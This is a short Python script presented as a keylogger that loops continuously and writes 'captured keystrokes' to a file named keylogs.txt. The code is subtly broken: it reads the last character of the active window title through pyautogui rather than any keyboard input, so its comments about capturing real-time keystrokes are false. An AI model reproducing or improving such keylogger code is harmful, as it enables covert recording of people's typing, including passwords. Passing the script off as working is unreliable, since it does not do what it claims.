import pyautogui
import time

# Define a function to handle special keys
def get_special_key(key):
    special_keys = {
        '\r': '[ENTER]',
        '\t': '\t',
        '\b': '[BACKSPACE]',
        ' ': ' ',
    }
    return special_keys.get(key, key)

# Define the main function to log keystrokes
def log_keystrokes():
    with open('keylogs.txt', 'w') as f:
        # Capture real-time keystrokes and save them to a file
        try:
            while True:
                key = get_special_key(pyautogui.getActiveWindowTitle()[-1])
                print(f'Captured: {key}')
                f.write(str(key))
                f.flush()
                time.sleep(0.2)
        except KeyboardInterrupt:
            pass

# Run the logging script
if __name__ == '__main__':
    log_keystrokes()
